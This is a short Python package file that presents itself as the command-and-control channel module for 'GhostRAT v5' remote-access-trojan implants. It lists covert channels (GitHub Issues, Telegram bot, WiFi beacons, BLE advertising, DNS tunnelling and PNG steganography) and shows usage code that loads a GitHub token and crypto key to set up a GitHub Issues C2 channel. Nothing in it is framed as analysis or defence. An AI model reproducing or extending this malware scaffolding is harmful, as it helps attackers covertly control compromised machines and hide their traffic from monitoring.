"""
GhostRAT v5 — C2 Channels Package
==================================

Multi-channel C2 support for GhostRAT v5 implants.

Supported channels:
- GitHub Issues (github_issues)
- Telegram Bot (telegram)
- WiFi Beacon (wifi_beacon)
- BLE Advertising (ble_adv)
- DNS Tunnel (dns_tunnel)
- PNG Stego (png_stego)

Usage:
    from c2.config import C2Config
    from c2.github_issues import GitHubIssuesC2

    config = C2Config.load_from_file("c2/github_config.json")
    c2 = GitHubIssuesC2(
        config.github_repo_owner,
        config.github_repo_name,
        config.github_token,
        crypto_key=config.crypto_key
    )
"""

from c2.config import C2Config

__all__ = ["C2Config"]
__version__ = "5.0.0"
